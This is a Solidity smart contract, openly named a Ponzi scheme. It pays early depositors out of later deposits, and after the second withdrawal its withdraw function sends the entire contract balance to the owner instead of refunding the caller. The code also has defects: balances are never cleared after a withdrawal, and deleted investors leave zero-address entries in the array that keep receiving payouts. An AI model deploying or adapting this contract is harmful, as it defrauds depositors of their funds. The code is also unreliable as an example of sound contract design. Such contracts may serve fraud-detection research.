pragma solidity >=0.4.22 <0.6.0;

contract ComplexPonzi {
    uint public withdrawCounter;
    mapping (address => uint) accountBalances;
    address payable[] public foolishInvestors;
    address payable public owner;
    uint public contractBalance;
    
    constructor() public {
        owner = msg.sender;
        contractBalance = address(this).balance;
    }
    
    function invest() public payable {
        require(msg.value >= .01 ether);
        require(alreadyInvestor(msg.sender) == false);
        
        foolishInvestors.push(msg.sender);
        accountBalances[msg.sender] = msg.value;
        payOut();
        
        contractBalance = address(this).balance;
    }
    
    function addToInvestment() public payable {
        require(msg.value >= .01 ether);
        require(alreadyInvestor(msg.sender) == true);
        
        accountBalances[msg.sender] += msg.value;
        
        contractBalance = address(this).balance;
    }
    
    function payOut () private {
        uint256 amountInContract = (address(this).balance)/10;
        uint256 payOutAmount = amountInContract/foolishInvestors.length;
        
        // Transfers a small part of the contract amount to each investor.
        for (uint i=0; i<foolishInvestors.length; i++) {
            foolishInvestors[i].transfer(payOutAmount);
        }
        
        contractBalance = address(this).balance;
    }
    
    function withdraw() public payable {
        require(alreadyInvestor(msg.sender) == true);
        
        if (withdrawCounter >= 2) 
            owner.transfer(contractBalance);
        else 
            msg.sender.transfer(accountBalances[msg.sender]);
        
        // This deletes the investor which is pulling out from the foolishInvestors 
        // array. Thus insuring that they do not recieve any future payouts.
        for (uint i = 0; i<foolishInvestors.length; i++) {
            if (foolishInvestors[i] == msg.sender)
                delete foolishInvestors[i];
        }
        
        contractBalance = address(this).balance;
        withdrawCounter += 1;
    }
    
    function returnBalance() public payable returns (uint) {
        if (alreadyInvestor(msg.sender) == true)
            return accountBalances[msg.sender];
        else
            return 0;
    }
    
    function alreadyInvestor(address) private view returns (bool) {
        bool investorBool = false;
        for (uint i = 0; i<foolishInvestors.length; i++) {
            if (foolishInvestors[i] == msg.sender)
                investorBool = true;
        }
        return investorBool;
    }
}